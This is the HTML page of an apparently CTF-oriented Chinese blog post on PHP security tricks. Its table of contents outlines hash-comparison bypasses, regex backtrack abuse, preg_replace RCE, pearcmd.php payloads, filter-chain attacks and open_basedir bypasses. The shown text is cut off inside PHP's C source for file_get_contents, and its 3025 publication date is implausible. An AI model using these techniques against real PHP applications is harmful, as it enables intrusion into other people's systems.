<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="include和file_get_content处理伪协议的不同在讲这个内容之前，我们需要了解一下file_get_content的源码实现 file_get_content的源码实现在 PHP 源码里，file_get_contents 定义在 ext&#x2F;standard&#x2F;file.c，直接去github下载到本地看吧 https:&#x2F;&#x2F;github.com&#x2F;php&#x2F;php-sr">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP的一些小技巧">
<meta property="og:url" content="https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="include和file_get_content处理伪协议的不同在讲这个内容之前，我们需要了解一下file_get_content的源码实现 file_get_content的源码实现在 PHP 源码里，file_get_contents 定义在 ext&#x2F;standard&#x2F;file.c，直接去github下载到本地看吧 https:&#x2F;&#x2F;github.com&#x2F;php&#x2F;php-sr">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251101195023820.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251101234410001.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251101234958842.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251101235136654.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251102001239686.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251102001830074.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251102003229685.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/9ed27e530d8b8e2ec0c225fe8a85d8ec.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250611170208447.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251013144517827.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403142430100.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/51bfc7bb-fd9a-402e-971a-a2247b226f3d.3adc35af4c1d.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403150831133.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403150958553.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250403151342526.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403151628711.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403151741726.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403154616821.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250403161315817.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403162447924.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250325112657901.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250411150622351.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250411161125698.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250411161443151.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250411161733120.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250411162109606.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250411164606166.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/exponential_size_0.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250416190255404.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250416190432393.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250416190513189.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250430204203212.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250507202521426.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250903170700328.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250903170743326.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250903170844776.png">
<meta property="article:published_time" content="3025-05-07T11:46:51.000Z">
<meta property="article:modified_time" content="2025-11-02T10:48:21.552Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="php小技巧">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251101195023820.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>PHP的一些小技巧</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	

<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">H0me</a></li><!--
     --><!--
       --><li><a href="/about/">A6out</a></li><!--
     --><!--
       --><li><a href="/tags/">T6gs</a></li><!--
     --><!--
       --><li><a href="/categories/">Catagory</a></li><!--
     --><!--
       --><li><a href="/links/">L1nks</a></li><!--
     --><!--
       --><li><a href="/search/">s4arch</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/3025/05/21/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAsql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&text=PHP的一些小技巧"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&title=PHP的一些小技巧"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&is_video=false&description=PHP的一些小技巧"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=PHP的一些小技巧&body=Check out this article: https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&title=PHP的一些小技巧"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&title=PHP的一些小技巧"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&title=PHP的一些小技巧"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&title=PHP的一些小技巧"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&name=PHP的一些小技巧&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&t=PHP的一些小技巧"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#include%E5%92%8Cfile-get-content%E5%A4%84%E7%90%86%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E4%B8%8D%E5%90%8C"><span class="toc-number">1.</span> <span class="toc-text">include和file_get_content处理伪协议的不同</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-get-content%E7%9A%84%E6%BA%90%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">file_get_content的源码实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include%E7%9A%84%E6%BA%90%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.2.</span> <span class="toc-text">include的源码实现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Emd5%E5%92%8Csha1%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">关于md5和sha1绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">1.数组绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-0e%E7%BB%95%E8%BF%87%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-number">2.2.</span> <span class="toc-text">2.0e绕过弱比较</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-string%E8%BD%AC%E6%8D%A2%E5%90%8Emd5%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.</span> <span class="toc-text">3.string转换后md5绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%8F%8C%E9%87%8Dmd5%E4%B8%8B%E7%9A%840e%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">4.双重md5下的0e绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-md5%E7%BB%95%E8%BF%87SQL"><span class="toc-number">2.5.</span> <span class="toc-text">5.md5绕过SQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-md5-sha1-%E5%8A%A0%E5%AF%86%E5%90%8E%E5%BC%B1%E7%AD%89%E4%BA%8E%E5%88%9D%E5%A7%8B%E5%80%BC"><span class="toc-number">2.6.</span> <span class="toc-text">6.md5(sha1)加密后弱等于初始值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%9B%BE%E7%89%87%E6%96%87%E6%9C%AC%E5%BC%BA%E7%A2%B0%E6%92%9E%E7%BB%95%E8%BF%87"><span class="toc-number">2.7.</span> <span class="toc-text">7.图片文本强碰撞绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#is-numeric-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">is_numeric()函数绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#strcmp-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">strcmp()函数绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#intval-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">intval()函数漏洞绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFintval-%EF%BC%9F"><span class="toc-number">5.1.</span> <span class="toc-text">什么是intval()？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="toc-number">5.2.</span> <span class="toc-text">绕过思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stripos-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">stripos()函数绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Epreg-match-%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">关于preg_match()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFpreg-match%EF%BC%9F"><span class="toc-number">7.1.</span> <span class="toc-text">什么是preg_match？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">7.2.</span> <span class="toc-text">绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">7.3.</span> <span class="toc-text">PHP利用PCRE回溯次数限制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E5%BC%95%E6%93%8E"><span class="toc-number">7.4.</span> <span class="toc-text">正则引擎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E6%BA%AF%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-number">7.5.</span> <span class="toc-text">回溯的过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EPHP%E7%9A%84pcre-backtrack-limit%E9%99%90%E5%88%B6%E5%88%A9%E7%94%A8"><span class="toc-number">7.6.</span> <span class="toc-text">关于PHP的pcre.backtrack_limit限制利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#preg-replace-e-%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84RCE"><span class="toc-number">8.</span> <span class="toc-text">preg_replace &#x2F;e 模式下的RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFpreg-replace-%E5%87%BD%E6%95%B0%EF%BC%9F"><span class="toc-number">8.1.</span> <span class="toc-text">什么是preg_replace()函数？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E5%BC%95%E7%94%A8"><span class="toc-number">8.2.</span> <span class="toc-text">反向引用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%B8%AD%E9%9D%9E%E6%B3%95%E5%8F%98%E9%87%8F%E7%9A%84%E8%A7%A3%E6%9E%90"><span class="toc-number">9.</span> <span class="toc-text">PHP中非法变量的解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pearcmd-php%E7%9A%84%E5%A6%99%E7%94%A8"><span class="toc-number">10.</span> <span class="toc-text">pearcmd.php的妙用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-register-argc-argv"><span class="toc-number">10.1.</span> <span class="toc-text">1. register_argc_argv</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-register-argc-argv%E5%92%8Cpear%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">10.2.</span> <span class="toc-text">2.register_argc_argv和pear的关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-payload"><span class="toc-number">10.3.</span> <span class="toc-text">3.payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%83%E9%80%B8eval%E4%B8%AD%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">11.</span> <span class="toc-text">逃逸eval中注释符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-filter-chains%E7%9A%84%E6%8A%A5%E9%94%99%E6%94%BB%E5%87%BB"><span class="toc-number">12.</span> <span class="toc-text">PHP filter chains的报错攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hash-file%E5%87%BD%E6%95%B0"><span class="toc-number">12.1.</span> <span class="toc-text">hash_file函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFPHP-filter-chains"><span class="toc-number">12.2.</span> <span class="toc-text">什么是PHP filter chains</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file%E5%87%BD%E6%95%B0"><span class="toc-number">12.3.</span> <span class="toc-text">file函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">12.4.</span> <span class="toc-text">攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8iconv%E8%A7%A6%E5%8F%91%E5%86%85%E5%AD%98%E9%94%99%E8%AF%AF"><span class="toc-number">12.4.1.</span> <span class="toc-text">利用iconv触发内存错误</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%B3%84%E6%BC%8F%E6%96%87%E4%BB%B6%E7%AC%AC1%E4%B8%AA%E5%AD%97%E7%AC%A6"><span class="toc-number">12.4.2.</span> <span class="toc-text">如何泄漏文件第1个字符</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pathinfo-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">13.</span> <span class="toc-text">pathinfo()函数绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pathinfo-%E5%87%BD%E6%95%B0"><span class="toc-number">13.1.</span> <span class="toc-text">pathinfo()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#move-uploaded-file%E7%9A%84%E4%B8%80%E4%B8%AA%E7%BB%86%E8%8A%82"><span class="toc-number">14.</span> <span class="toc-text">move_uploaded_file的一个细节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#in-array-%E5%87%BD%E6%95%B0%E5%BC%B1%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">15.</span> <span class="toc-text">in_array() 函数弱比较漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#strcmp-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E"><span class="toc-number">16.</span> <span class="toc-text">strcmp()函数漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EPHP%E4%BC%98%E5%85%88%E7%BA%A7%E7%9A%84%E8%A7%84%E5%88%99"><span class="toc-number">17.</span> <span class="toc-text">关于PHP优先级的规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#finfo%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">18.</span> <span class="toc-text">finfo文件注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-open-basedir"><span class="toc-number">19.</span> <span class="toc-text">bypass open_basedir</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0bypass"><span class="toc-number">19.1.</span> <span class="toc-text">命令执行函数bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8glob-%E4%BC%AA%E5%8D%8F%E8%AE%AEBypass"><span class="toc-number">19.2.</span> <span class="toc-text">利用glob:&#x2F;&#x2F;伪协议Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DirectoryIterator-glob"><span class="toc-number">19.2.1.</span> <span class="toc-text">DirectoryIterator+glob:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#opendir-readdir-glob"><span class="toc-number">19.2.2.</span> <span class="toc-text">opendir()+readdir()+glob:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8chdir-%E4%B8%8Eini-set-%E7%BB%84%E5%90%88"><span class="toc-number">19.3.</span> <span class="toc-text">利用chdir()与ini_set()组合</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        PHP的一些小技巧
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wanTh3flag</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="3025-05-07T11:46:51.000Z" class="dt-published" itemprop="datePublished">3025-05-07</time>
        
        (Updated: <time datetime="2025-11-02T10:48:21.552Z" class="dt-updated" itemprop="dateModified">2025-11-02</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/php%E7%9F%A5%E8%AF%86%E7%82%B9%E7%A7%AF%E7%B4%AF/">php知识点积累</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/php%E5%B0%8F%E6%8A%80%E5%B7%A7/" rel="tag">php小技巧</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="include和file-get-content处理伪协议的不同"><a href="#include和file-get-content处理伪协议的不同" class="headerlink" title="include和file_get_content处理伪协议的不同"></a>include和file_get_content处理伪协议的不同</h2><p>在讲这个内容之前，我们需要了解一下file_get_content的源码实现</p>
<h3 id="file-get-content的源码实现"><a href="#file-get-content的源码实现" class="headerlink" title="file_get_content的源码实现"></a>file_get_content的源码实现</h3><p>在 PHP 源码里，<code>file_get_contents</code> 定义在 <strong>ext&#x2F;standard&#x2F;file.c</strong>，直接去github下载到本地看吧</p>
<p><a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/PHP-7.3.6/ext/standard/file.c">https://github.com/php/php-src/blob/PHP-7.3.6/ext/standard/file.c</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(file_get_contents)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *filename;</span><br><span class="line">	<span class="type">size_t</span> filename_len;</span><br><span class="line">	zend_bool use_include_path = <span class="number">0</span>;</span><br><span class="line">	php_stream *stream;</span><br><span class="line">	zend_long offset = <span class="number">0</span>;</span><br><span class="line">	zend_long maxlen = (<span class="type">ssize_t</span>) PHP_STREAM_COPY_ALL;</span><br><span class="line">	zval *zcontext = <span class="literal">NULL</span>;</span><br><span class="line">	php_stream_context *context = <span class="literal">NULL</span>;</span><br><span class="line">	zend_string *contents;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Parse arguments */</span></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">5</span>)</span><br><span class="line">		Z_PARAM_PATH(filename, filename_len)</span><br><span class="line">		Z_PARAM_OPTIONAL</span><br><span 